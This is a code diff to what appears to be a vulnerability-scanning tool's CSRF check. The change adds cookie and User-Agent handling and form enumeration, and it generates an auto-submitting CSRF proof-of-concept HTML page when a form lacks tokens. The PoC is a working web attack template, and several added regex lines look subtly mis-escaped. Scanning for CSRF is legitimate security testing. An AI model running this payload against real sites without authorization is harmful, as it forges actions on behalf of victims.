@@ -518,6 +518,7 @@ elif accessible_count == 0:
         parameters=[
             SkillParameter("target", "string", True, description="目标表单URL"),
             SkillParameter("method", "string", False, "POST", "请求方法"),
+            SkillParameter("cookie", "string", False, "", "认证Cookie（如 security=low; PHPSESSID=xxx）"),
         ],
         target_type="url",
         severity="medium",
@@ -529,54 +530,60 @@ import re
 
 target = "{{target}}"
 method = "{{method}}"
+cookie = "{{cookie}}"
 
 try:
     req = urllib.request.Request(target)
+    if cookie:
+        req.add_header("Cookie", cookie)
+    req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
     response = urllib.request.urlopen(req, timeout=10)
-    content = response.read().decode('utf-8', errors='ignore')
-    
+    content = response.read().decode("utf-8", errors="ignore")
+
     # 检测 CSRF Token
     csrf_patterns = [
-        r'name=["\']csrf[_-]?token["\']',
-        r'name=["\']_token["\']',
-        r'name=["\']authenticity_token["\']',
-        r'name=["\']__RequestVerificationToken["\']',
-        r'<input[^>]+type=["\']hidden["\'][^>]+value=["\'][^"\']+["\']',
+        r\'name=["\\\']csrf[_-]?token["\\\']\',
+        r\'name=["\\\']_token["\\\']\',
+        r\'name=["\\\']authenticity_token["\\\']\',
+        r\'name=["\\\']__RequestVerificationToken["\\\']\',
+        r\'<input[^>]+type=["\\\']hidden["\\\'][^>]+value=["\\\'][^"\\\']]+["\\\']\',
     ]
-    
+
     csrf_found = False
     for pattern in csrf_patterns:
         if re.search(pattern, content, re.IGNORECASE):
             csrf_found = True
-            print(f"CSRF_TOKEN_FOUND: {pattern[:30]}...")
+            print("CSRF_TOKEN_FOUND:", pattern[:30])
             break
-    
+
     # 检测表单
-    forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', content, re.IGNORECASE)
-    
+    forms = re.findall(r\'<form[^>]*action=["\\\']([^"\\\']*)["\\\']\', content, re.IGNORECASE)
+    inputs = re.findall(r\'<input[^>]*name=["\\\']([^"\\\']*)["\\\']\', content, re.IGNORECASE)
+    print("FORMS:", forms)
+    print("INPUTS:", inputs)
+
     if not csrf_found and forms:
-        print("\\nCSRF_VULNERABLE: No CSRF token found in forms")
+        print("CSRF_VULNERABLE: No CSRF token found in forms")
         print("FORMS_FOUND:", len(forms))
-        
-        # 生成 PoC
-        print("\\n=== CSRF PoC ===")
-        poc_html = """<html>
-<body>
-<form action="""" + target + """" method="""" + method + """">
-<input type="hidden" name="field" value="attacker_value" />
-<input type="submit" value="Submit" />
-</form>
-<script>document.forms[0].submit();</script>
-</body>
-</html>"""
-        print(poc_html)
+        print("=== CSRF PoC ===")
+        form_action = forms[0] if forms[0].startswith("http") else target
+        poc = (
+            "<html><body>"
+            + \'<form action="\' + form_action + \'" method="\' + method + \'">\' 
+            + \'<input type="hidden" name="field" value="attacker_value" />\' 
+            + \'<input type="submit" value="Submit" />\' 
+            + "</form>"
+            + "<script>document.forms[0].submit();</script>"
+            + "</body></html>"
+        )
+        print(poc)
     elif csrf_found:
-        print("\\nCSRF_PROTECTED: CSRF token detected")
+        print("CSRF_PROTECTED: CSRF token detected")
     else:
-        print("\\nNO_FORMS: No forms found on page")
-        
+        print("NO_FORMS: No forms found on page")
+
 except Exception as e:
-    print("ERROR:", str(e)[:100])
+    print("ERROR:", str(e)[:200])
 '''
     ))
     
